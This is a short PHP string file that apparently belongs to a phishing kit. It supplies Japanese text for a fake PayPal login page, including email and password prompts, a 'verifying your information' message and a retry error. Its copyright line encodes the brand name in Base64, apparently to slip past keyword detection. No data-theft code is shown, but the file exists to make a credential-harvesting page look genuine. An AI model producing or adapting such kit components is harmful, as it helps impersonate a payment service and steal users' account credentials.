<?php
$Z118_01 = "PayPalアカウントへのログイン";
$Z118_02 = "メール";
$Z118_03 = "パスワード";
$Z118_04 = "必須";
$Z118_05 = "必須";
$Z118_06 = "ログイン";
$Z118_07 = "メールアドレスまたはパスワードをお忘れの場合";
$Z118_08 = "新規登録";
$Z118_09 = "プライバシー";
$Z118_10 = "規約";
$Z118_11 = "Copyright © 1999-<script>document.write(new Date().getFullYear());</script> <script>document.write(Base64.decode('UGF5UGFs'));</script>. All rights reserved.";
$Z118_12 = "情報を認証中...";
$Z118_13 = "あなたの情報の一部が正しくありません。もう一度やり直してください。";
?>
